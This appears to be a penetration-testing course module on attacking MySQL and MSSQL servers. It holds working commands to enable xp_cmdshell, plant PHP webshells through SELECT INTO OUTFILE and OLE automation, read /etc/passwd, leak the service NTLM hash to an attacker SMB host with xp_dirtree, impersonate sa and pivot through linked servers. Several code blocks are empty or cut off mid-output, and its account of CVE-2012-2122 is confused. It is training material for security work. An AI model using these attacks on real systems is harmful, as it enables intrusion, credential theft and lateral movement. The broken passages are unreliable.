# SQL Databases

## Attacking SQL Databases

***

[MySQL](https://www.mysql.com/) and [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) are [relational database](https://en.wikipedia.org/wiki/Relational\_database) management systems that store data in tables, columns, and rows. Many relational database systems like MSSQL & MySQL use the [Structured Query Language](https://en.wikipedia.org/wiki/SQL) (`SQL`) for querying and maintaining the database.

Databases hosts are considered to be high targets since they are responsible for storing all kinds of sensitive data, including, but not limited to, user credentials, `Personal Identifiable Information (PII)`, business-related data, and payment information. In addition, those services often are configured with highly privileged users. If we gain access to a database, we may be able to leverage those privileges for more actions, including lateral movement and privilege escalation.

***

### Enumeration

By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port. We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system:

```

The Nmap scan reveals essential information about the target, like the version and hostname, which we can use to identify common misconfigurations, specific attacks, or known vulnerabilities. Let's explore some common misconfigurations and protocol specifics attacks.

### Authentication Mechanisms

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                     |

`MySQL` also supports different [authentication methods](https://dev.mysql.com/doc/internals/en/authentication-method.html), such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can [choose an authentication mode](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode) for many reasons, including compatibility, security, usability, and more. However, depending on which method is implemented, misconfigurations can occur.

In the past, there was a vulnerability [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) in `MySQL 5.6.x` servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the `timing attack` vulnerability existed in the way MySQL handled authentication attempts.

In this timing attack, MySQL repeatedly attempts to authenticate to a server and measures the time it takes for the server to respond to each attempt. By measuring the time it takes the server to respond, we can determine when the correct password has been found, even if the server does not indicate success or failure.

In the case of `MySQL 5.6.x`, the server takes longer to respond to an incorrect password than to a correct one. Thus, if we repeatedly try to authenticate with the same incorrect password, we will eventually receive a response indicating that the correct password was found, even though it was not.

**Misconfigurations**

Misconfigured authentication in SQL Server can let us access the service without credentials if anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.

**Privileges**

Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:

* Read or change the contents of a database
* Read or change the server configuration
* Execute commands
* Read local files
* Communicate with other databases
* Capture the local system hash
* Impersonate existing users
* Gain access to other networks

In this section, we will explore some of these attacks.

***

### Protocol Specific Attacks

It is crucial to understand how SQL syntax works. We can use the free [SQL Injection Fundamentals](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals) module to introduce ourselves to SQL syntax. Even though this module covers MySQL, MSSQL and MySQL syntax are pretty similar.

**Read/Change the Database**

Let's imagine we gained access to a SQL Database. First, we need to identify existing databases on the server, what tables the database contains, and finally, the contents of each table. Keep in mind that we may find databases with hundreds of tables. If our goal is not just getting access to the data, we will need to pick which tables may contain interesting information to continue our attacks, such as usernames and passwords, tokens, configurations, and more. Let's see how we can do this:

**MySQL - Connecting to the SQL Server**

Attacking SQL Databases

```shell-session
AIceBear@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

**Sqlcmd - Connecting to the SQL Server**

Attacking SQL Databases

```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

Note: When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.

If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:

Attacking SQL Databases

```shell-session
AIceBear@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.

Attacking SQL Databases

```shell-session
AIceBear@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

Note: When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:

**SQL Default Databases**

Before we explore using SQL syntax, it is essential to know the default databases for `MySQL` and `MSSQL`. Those databases hold information about the database itself and help us enumerate database names, tables, columns, etc. With access to those databases, we can use some system stored procedures, but they usually don't contain company data.

Note: We will get an error if we try to list or connect to a database we don't have permissions to.

`MySQL` default system schemas/databases:

* `mysql` - is the system database that contains tables that store information required by the MySQL server
* `information_schema` - provides access to database metadata
* `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
* `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:

* `master` - keeps the information for an instance of SQL Server.
* `msdb` - used by SQL Server Agent.
* `model` - a template database copied for each new database.
* `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
* `tempdb` - keeps temporary objects for SQL queries.

**SQL Syntax**

**Show Databases**

Attacking SQL Databases

```shell-session
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.

Attacking SQL Databases

```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

**Select a Database**

Attacking SQL Databases

```shell-session
mysql> USE htbusers;

Database changed
```

Attacking SQL Databases

```cmd-session
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```

**Show Tables**

Attacking SQL Databases

```shell-session
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |

| users                      |
+----------------------------+

```

Attacking SQL Databases

```cmd-session

```

**Select all Data from Table "users"**

Attacking SQL Databases

```shell-session
mysql> SELECT * FROM users;

```

### Execute Commands

`Command execution` is one of the most desired capabilities when attacking common services because it allows us to control the operating system. If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:

* `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp\_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
* The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
* `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

To execute commands using SQL syntax on MSSQL, use:

**XP\_CMDSHELL**

Attacking SQL Databases

```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

Code: mssql

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.

`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib\_mysqludf\_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.

***

### Write Local Files

`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. Then we can browse to the location where the file is and execute our commands.

**MySQL - Write Local File**

Attacking SQL Databases

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

In `MySQL`, a global system variable [secure\_file\_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar\_secure\_file\_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD\_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function\_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv\_file) privilege.

`secure_file_priv` may be set as follows:

* If empty, the variable has no effect, which is not a secure setting.
* If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
* If set to NULL, the server disables import and export operations.

In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:

**MySQL - Secure File Privileges**

Attacking SQL Databases

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

**MSSQL - Enable Ole Automation Procedures**

Attacking SQL Databases

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

**MSSQL - Create a File**

Attacking SQL Databases

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

***

### Read Local Files

By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

**Read Local Files in MSSQL**

Attacking SQL Databases

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

As we previously mentioned, by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

**MySQL - Read Local Files in MySQL**

Attacking SQL Databases

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

### Capture MSSQL Service Hash

In the `Attacking SMB` section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:

**XP\_DIRTREE Hash Stealing**

Attacking SQL Databases

```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

**XP\_SUBDIRS Hash Stealing**

Attacking SQL Databases

```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.

**XP\_SUBDIRS Hash Stealing with Responder**

Attacking SQL Databases

```shell-session
AIceBear@htb[/htb]$ sudo responder -I tun0

                                         __

### Impersonate Existing Users with MSSQL

SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the `IMPERSONATE` privilege can lead to privilege escalation in SQL Server.

First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:

**Identify Users that We Can Impersonate**

Attacking SQL Databases

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:

**Verifying our Current User and Role**

Attacking SQL Databases

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.

**Impersonating the SA User**

Attacking SQL Databases

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

Note: It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

We can now execute any command as a sysadmin as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

Note: If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

### Communicate with Other Databases with MSSQL

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.

**Identify linked Servers in MSSQL**

Attacking SQL Databases

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

Attacking SQL Databases

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

As we have seen, we can now execute queries with sysadmin privileges on the linked server. As `sysadmin`, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`. This section covered some of the most common ways to attack SQL Server and MySQL databases during penetration testing engagements. There are other methods for attacking these database types as well as others, such as [PostGreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql), SQLite, Oracle, [Firebase](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/buckets/firebase-database), and [MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb) which will be covered in other modules. It is worth taking some time to read up on these database technologies and some of the common ways to attack them as well.
